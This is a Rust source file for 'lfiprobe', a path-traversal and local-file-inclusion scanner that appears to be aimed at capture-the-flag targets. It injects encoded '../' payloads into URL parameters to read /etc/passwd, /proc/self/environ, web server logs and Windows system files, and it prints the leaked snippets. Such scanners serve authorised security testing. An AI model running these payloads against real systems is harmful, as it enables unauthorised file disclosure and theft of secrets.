//! lfiprobe — LFI / Path Traversal Detection Tool
//! NuRichter · CySec Arsenal
//!
//! Usage:
//!   lfiprobe -u "http://target.ctf/page?file=home"
//!   lfiprobe -u "http://target.ctf/page?file=home" --param file --deep

use std::time::Duration;
use anyhow::Result;
use arsenal_core::{banner::{print_banner, Module}, Finding, Severity, found, info, ok, warn};
use clap::Parser;
use colored::Colorize;

const TRAVERSE: &[&str] = &[
    "../", "../../", "../../../", "../../../../",
    "..%2F", "..%2F..%2F", "..%252F", "....//", ".././",
];

const TARGETS_LINUX: &[(&str, &[&str])] = &[
    ("/etc/passwd",        &["root:x:", "daemon:", "/bin/"]),
    ("/etc/hosts",         &["localhost", "127.0.0.1"]),
    ("/proc/version",      &["linux version", "gcc"]),
    ("/proc/self/environ", &["PATH=", "HOME="]),
    ("/var/log/apache2/access.log", &["GET /", "HTTP/1."]),
    ("/var/log/nginx/access.log",   &["GET /", "HTTP/1."]),
];

const TARGETS_WIN: &[(&str, &[&str])] = &[
    ("C:/Windows/win.ini",                          &["[fonts]", "[extensions]"]),
    ("C:/Windows/System32/drivers/etc/hosts",       &["localhost", "127.0.0.1"]),
    ("C:/boot.ini",                                 &["[boot loader]"]),
];

#[derive(Parser, Debug)]
#[command(name = "lfiprobe", about = "📂 LFI Probe — CySec Arsenal")]
struct Args {
    #[arg(short = 'u', long)] url:     String,
    #[arg(long, default_value = "")]   param:   String,
    #[arg(long)]                       deep:    bool,
    #[arg(long, default_value_t = 8000)] timeout: u64,
    #[arg(long)]                       json:    bool,
}

#[derive(Debug, serde::Serialize)]
struct LfiResult {
    param:     String,
    file:      String,
    traversal: String,
    url:       String,
    signature: String,
    snippet:   String,
}

fn inject_url(base: &url::Url, param: &str, payload: &str) -> String {
    let mut pairs: Vec<(String, String)> = base.query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    for (k, v) in &mut pairs {
        if k == param {
            *v = payload.to_string();
        }
    }
    let qs: String = pairs.iter()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("&");
    format!("{}?{}", base.origin().ascii_serialization() + base.path(), qs)
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    if !args.json { print_banner(Module::LfiProbe); }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_millis(args.timeout))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (lfiprobe/1.0 CTF)")
        .build()?;

    let parsed = url::Url::parse(&args.url)?;
    let params: Vec<String> = parsed.query_pairs()
        .filter(|(k, _)| args.param.is_empty() || k.as_ref() == args.param)
        .map(|(k, _)| k.into_owned())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    if params.is_empty() {
        println!("{}", warn("No GET parameters found."));
        return Ok(());
    }

    let targets_iter = TARGETS_LINUX.iter()
        .chain(if args.deep { TARGETS_WIN.iter() } else { [].iter() });

    let traversals = if args.deep { TRAVERSE } else { &TRAVERSE[..5] };

    let mut findings = Vec::new();
    let mut json_results: Vec<LfiResult> = Vec::new();

    for param in &params {
        if !args.json { println!("  {}", info(&format!("Testing parameter: {}", param.yellow()))); }

        for (target_file, sigs) in targets_iter.clone() {
            for traversal in traversals {
                let payload   = format!("{}{}", traversal, target_file);
                let test_url  = inject_url(&parsed, param, &payload);

                let Ok(resp) = client.get(&test_url).send().await else { continue };
                let body = resp.text().await.unwrap_or_default();
                let body_lower = body.to_lowercase();

                for sig in *sigs {
                    if body_lower.contains(sig) {
                        let idx     = body_lower.find(sig).unwrap_or(0);
                        let snippet = body[idx.saturating_sub(20)..
                                          (idx + 80).min(body.len())].trim().to_string();

                        if !args.json {
                            println!(
                                "\n  {} [LFI] param={} file={} sig={}",
                                "[>]".bright_magenta().bold(),
                                param.bright_yellow(), target_file.bright_white(), sig.bright_red()
                            );
                            println!("    Snippet: {:?}", &snippet[..snippet.len().min(60)]);
                        }

                        findings.push(Finding::new(
                            "LFI",
                            &args.url,
                            &format!("param={param} file={target_file}"),
                            Severity::High,
                        ));
                        json_results.push(LfiResult {
                            param: param.clone(),
                            file:  target_file.to_string(),
                            traversal: traversal.to_string(),
                            url: test_url.clone(),
                            signature: sig.to_string(),
                            snippet,
                        });
                        break;
                    }
                }
            }
        }
    }

    if args.json {
        println!("{}", serde_json::to_string_pretty(&json_results)?);
    } else {
        if findings.is_empty() {
            println!("\n  {}", ok("No LFI vectors detected."));
        } else {
            arsenal_core::print_findings(&findings);
        }
    }
    Ok(())
}
